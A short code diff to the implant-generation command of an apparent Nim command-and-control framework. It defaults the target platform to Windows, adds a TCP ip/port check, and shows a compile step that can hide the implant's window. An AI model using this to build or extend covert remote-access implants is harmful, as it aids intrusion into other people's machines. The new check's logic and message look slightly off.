@@ -6,7 +6,7 @@ import ../../logging
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   
   var listenerType: string = flags.getOrDefault("listener", flags.getOrDefault("l", ""))
-  var platform: string = flags.getOrDefault("platform", flags.getOrDefault("P", ""))
+  var platform: string = flags.getOrDefault("platform", flags.getOrDefault("P", "windows"))
   var ip: string = flags.getOrDefault("ip", flags.getOrDefault("i", ""))
   var port: string = flags.getOrDefault("port", flags.getOrDefault("p", ""))
   var showWindow: bool = parseBool(flags.getOrDefault("showwindow", flags.getOrDefault("s", "no")))
@@ -36,6 +36,9 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
         return
 
       infoLog "generating implant for " & $tcpListener
+  elif listenerType == "tcp" and ip == "" and port == "":
+    errorLog "you must specify and --ip and --port for the tcp client"
+    return
 
   let compileCommand = "nim c -d:client " &
     (if showWindow: "" else: "--app=gui " & " ") & # disable window 
